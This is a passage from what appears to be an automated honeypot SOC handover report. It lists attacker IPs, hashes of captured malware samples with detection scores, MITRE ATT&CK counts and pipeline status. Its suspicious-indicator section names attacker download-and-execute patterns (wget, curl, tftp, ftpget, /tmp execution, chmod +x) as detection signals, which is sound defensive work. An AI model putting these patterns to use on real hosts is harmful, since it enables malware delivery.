| `213.111.192[.]195` | **3** | 2026-08-20 12:36 | 2026-08-20 12:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.33.242[.]50` | **2** | 2026-08-20 12:31 | 2026-08-20 12:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.29.49[.]134` | **2** | 2026-08-20 11:51 | 2026-08-20 11:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.155.85[.]143` | **2** | 2026-08-20 12:06 | 2026-08-20 12:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `162.255.112[.]183` | 1 | 2026-08-20 10:59 | 2026-08-20 11:00 | 10s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-08-20 12:35 | 2026-08-20 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.234.217[.]129` | 1 | 2026-08-20 11:36 | 2026-08-20 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.36.62[.]238` | 1 | 2026-08-20 12:25 | 2026-08-20 12:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-08-20 11:11 | 2026-08-20 11:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `191.6.40[.]15` | 1 | 2026-08-20 12:17 | 2026-08-20 12:17 | 11s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]53` | 1 | 2026-08-20 12:24 | 2026-08-20 12:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.223.41[.]90` | 1 | 2026-08-20 12:34 | 2026-08-20 12:34 | 4s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-08-20 11:11 | 2026-08-20 11:11 | 6s | 0 | `T1592` | 🟢 LOW |
| `45.173.65[.]145` | 1 | 2026-08-20 11:25 | 2026-08-20 11:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]32` | 1 | 2026-08-20 10:58 | 2026-08-20 10:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-20 12:14 | 2026-08-20 12:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.20.133[.]56` | 1 | 2026-08-20 12:29 | 2026-08-20 12:29 | 7s | 0 | `T1592` | 🟢 LOW |
| `82.59.112[.]105` | 1 | 2026-08-20 11:24 | 2026-08-20 11:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-20 11:27 | 2026-08-20 11:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `95.234.158[.]101` | 1 | 2026-08-20 12:06 | 2026-08-20 12:06 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.107.80[.]93` | NL | Serverhosting | **100** ⚠️ | 50 |
| `117.216.33[.]31` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `182.53.52[.]68` | TH | TOT Public Company Limited | **100** ⚠️ | 50 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `61.2.44[.]54` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `95.234.158[.]101` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 1 |
| `117.33.242[.]50` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 37 |
| `178.178.194[.]128` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `1.247.245[.]61` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 75 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 136 cases |
| Tool 34  | Credential Extractor        | ✅ 80 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 62 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (9.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 63 priority case(s) shown individually · 22 recon entry/entries in table (6 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T14:41:54Z_
